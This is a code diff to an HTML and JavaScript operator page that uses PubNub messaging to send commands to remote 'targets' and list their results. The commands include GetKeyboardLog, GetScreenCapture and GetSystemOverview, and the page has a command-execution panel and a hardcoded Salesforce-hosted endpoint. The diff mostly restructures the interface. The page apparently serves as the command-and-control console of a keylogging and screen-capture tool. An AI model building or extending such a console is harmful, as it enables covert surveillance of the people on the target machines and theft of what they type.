@@ -47,6 +47,10 @@
             min-height: 10px;
           }
           
+          .collapsed {
+            display: none;
+          }
+
     </style>
 
     <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.12.0.3.min.js"></script>
@@ -92,18 +96,31 @@
     </div><br/>
 
     <div>
-        <button onclick="clearMessages();">Clear Messages</button>
-        <button onclick="sendMessageStr(document.getElementById('message_body').value)">Send Message</button></br></br>
+        <table>
+            <tr>
+                <td>
+                    <label for="messages">Messages:</label>
+                    <select id="messages" name="messages">
+                        <option value="SendTestMessage">SendTestMessage</option>
+                        <option value="GetFrontendUrls">GetFrontendUrls</option>
+                        <option value="GetScreenCapture">GetScreenCapture</option>
+                        <option value="GetKeyboardLog">GetKeyboardLog</option>
+                        <option value="GetSystemOverview">GetSystemOverview</option>
+                    </select>              
+                </td>
+                <td>
+                    <button onclick="writeMessage(createBuiltInCmd(document.getElementById('messages').value));">Write Message</button></br></br>
+                </td>
+                <td>
+                    <button onclick="sendMessageStr(document.getElementById('message_body').value)">Send Message</button></br></br>
+                </td>
+                <td>
+                    <button onclick="document.getElementById('message_body').value=''">Clear Message</button></br></br>
+                </td>
+            </tr>
+        </table>
         <textarea id="message_body" class="large-textbox" placeholder="Type your monospace text here..."></textarea></br>
-    </div>
-
-
-    <div>
-        <a href="javascript:void(0);" onclick="writeMessage(createBuiltInCmd('SendTestMessage'));">SendTestMessage</a><br/>
-        <a href="javascript:void(0);" onclick="writeMessage(createBuiltInCmd('GetFrontendUrls'));">GetFrontendUrls</a><br/>
-        <a href="javascript:void(0);" onclick="writeMessage(createBuiltInCmd('GetScreenCapture'))">GetScreenCapture</a><br/>
-        <a href="javascript:void(0);" onclick="writeMessage(createBuiltInCmd('GetKeyboardLog'))">GetKeyboardLog</a><br/>
-        <a href="javascript:void(0);" onclick="writeMessage(createBuiltInCmd('GetSystemOverview'))">GetSystemOverview</a><br/>
+        
     </div>
 
     <br/>
@@ -165,11 +182,14 @@
     <br/>
     
     <div>
-        <table>
+        <table border="1">
             <tr>
-                <td><a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('GetTargets'));">Get Targets</a></td>
-                <td>|</td>
-                <td><a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('RefreshTargets'));">Refresh Targets</a></td>
+                <th>Targets (
+                <a href="javascript:void(0);" onclick="collapseTable('targetsList');">Collapse</a> |                
+                <a href="javascript:void(0);" onclick="expandTable('targetsList');">Expand</a> |
+                <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('GetTargets'));">Get Targets</a> |
+                <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('RefreshTargets'));">Refresh Targets</a>
+                )</th>
             </tr>
         </table>
     </div>
@@ -207,10 +227,35 @@
 
     <br/>
     <br/>
-    
+        
+    <table border="1">
+        <tr>
+            <th>Commands ( <a href="javascript:void(0);" onclick="expandTable('commandsTable');">Expand</a> | 
+                <a href="javascript:void(0);" onclick="collapseTable('commandsTable');">Collapse</a> | 
+                <a href="javascript:void(0);" onclick="clearTable('commandsTable');">Clear</a> | 
+                <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('GetClientCommands'));">Refresh</a> )
+            </th>
+        </tr>
+    </table>
+    <table id="commandsTable" border="1">
+    </table>
+
+    <br/>
+    <br/>
+
+    <table border="1">
+        <tr>
+            <th style="text-align: left;">
+                Messages ( 
+                    <a href="javascript:void(0);" onclick="expandTable('messagesTable');">Expand</a> | 
+                    <a href="javascript:void(0);" onclick="collapseTable('messagesTable');">Collapse</a> | 
+                    <a href="javascript:void(0);" onclick="clearTable('messagesTable');">Clear</a> )
+            </th>
+        </tr>
+    </table>
+
     <table id="messagesTable" border="1">
         <tr>
-            <th>Messages</th>
         </tr>
     </table>
 
@@ -224,8 +269,6 @@
             let top = 10*base;
             return Math.floor(base + Math.random() * (top-base));
         }
-
-        // TODO: implement custom logger to override console.log
 
         let logmsg_index=0
 
@@ -268,9 +311,10 @@
 
     <script>
 
+        let msgindex = 1;
         let messagelist = [];
 
-        let msgindex = 1;
+        let commandslist = [];
 
         /*
         actualChannel: "clientid_88992233_JS_client"
@@ -386,17 +430,6 @@
             document.getElementById('processCDPUrl').value = 'https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/processcdp'+relativeUrl;
         }
 
-        function clearMessages() {
-            const rows = document.querySelectorAll('#messagesTable tbody tr');
-
-            rows.forEach(row => {
-                if ( ! row.querySelector('th') ) {
-                    row.remove();
-                }
-            });
-
-        }
-
         function createBuiltInCmd(cmdname) {
 
             let payload = { 
@@ -442,10 +475,51 @@
         function addMessage(message) {
             
             const table = document.getElementById("messagesTable");
-            const newRow = table.insertRow(-1);
-            const newCell = newRow.insertCell(0);
+            const tbody = table.createTBody();
 
-            newCell.textContent = JSON.stringify(message, null, 2);
+            let insertrow = (key, item) => {
+                let newRow = tbody.insertRow(-1);
+
+                let newCell = newRow.insertCell(0);
+                newCell.textContent = key;
+
+                newCell = newRow.insertCell(1);
+                newCell.textContent = JSON.stringify(item, null, 2);
+            };
+
+            let objStack = [];
+
+            objStack.push( {name:'ROOT', payload:message, path:''} );
+
+            while ( objStack.length > 0 ) {
+                let mobj = objStack.pop()
+                let objName = mobj['name'];
+                let obj = mobj['payload'];
+                let path = mobj['path'];
+                
+                insertrow(path + '.' + objName, '[---------]');
+
+                let keys = Object.getOwnPropertyNames(obj);
+
+                for ( let i=0; i<keys.length; i++) {
+                    let key = keys[i];
+                    let item = obj[key];
+
+                    if ( typeof item == 'object' ) {
+                        objStack.push( {name:'['+key+']', payload:item, path:path+'.'+objName} );
+                        continue;
+                    }
+
+                    insertrow(key, item);
+                }
+
+            }
+
+            newRow = tbody.insertRow(-1);
+            newCell = newRow.insertCell(0);
+            newCell.textContent = '-------------------- ';
+            newCell = newRow.insertCell(1);
+            newCell.textContent = '--------------------';
         }
         
         function processMessage(messageEvent) {
@@ -502,6 +576,9 @@
 
         }
 
+    </script>
+
+    <script>
         function refreshTargets(targets) {
             refreshTargetsTable(targets);
             refreshTargetIdList(targets);
@@ -601,9 +678,15 @@
                 dropdown.add(newOption);    
             });
         }
-    </script>
-    
-    <script>
+
+        function refreshCommands(commandsList) {
+            let telem = document.getElementById('commandsTable');
+
+            commandsList.forEach( cmd => {
+                console.log(cmd);
+            });
+        }
+
         function handleTargetIdChange(elem) {
             console.log('handleTargetIdChange: '+elem.value);
             let telem = document.getElementById('targetId');
@@ -644,6 +727,28 @@
             console.log('clearExecResult');
             document.getElementById('cmdResult').value = '';
         }
+
+        function collapseTable(tableid) {
+            let telem = document.getElementById(tableid);
+            telem.classList.add("collapsed");
+        }
+
+        function expandTable(tableid) {
+            let telem = document.getElementById(tableid);
+            telem.classList.remove("collapsed");
+        }
+
+        function clearTable(tableid) {
+            const rows = document.querySelectorAll('#'+tableid+' tbody tr');
+
+            rows.forEach(row => {
+                if ( ! row.querySelector('th') ) {
+                    row.remove();
+                }
+            });
+
+        }
+
     </script>
 </body>
 
